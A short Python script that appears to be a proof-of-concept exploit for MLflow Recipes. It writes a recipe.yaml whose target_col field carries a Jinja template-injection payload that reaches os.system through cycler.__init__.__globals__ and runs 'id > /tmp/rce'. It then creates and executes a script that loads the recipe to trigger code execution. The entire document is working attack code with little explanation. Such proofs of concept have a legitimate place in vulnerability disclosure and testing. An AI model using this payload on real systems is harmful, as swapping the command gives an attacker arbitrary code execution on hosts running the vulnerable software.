import os

# Example setup for the exploit
os.makedirs("./recipes/profiles", exist_ok=True)

# Write a configuration file
with open("./recipes/profiles/local.yaml", "w") as file:
    file.write("profile: local")

# Prepare malicious input
malicious_input = '''\
recipe: "regression/v1"
target_col: {{ cycler.__init__.__globals__.os.system("id > /tmp/rce") }}
'''
with open("./recipes/recipe.yaml", "w") as file:
    file.write(malicious_input)

# Script to trigger the exploit
run_script = '''\
import os
from mlflow.recipes import Recipe
os.chdir("./recipes")
regression_recipe = Recipe(profile="local")
'''
with open("run.py", "w") as file:
    file.write(run_script)

# Execute the exploit
os.system("python3 run.py")
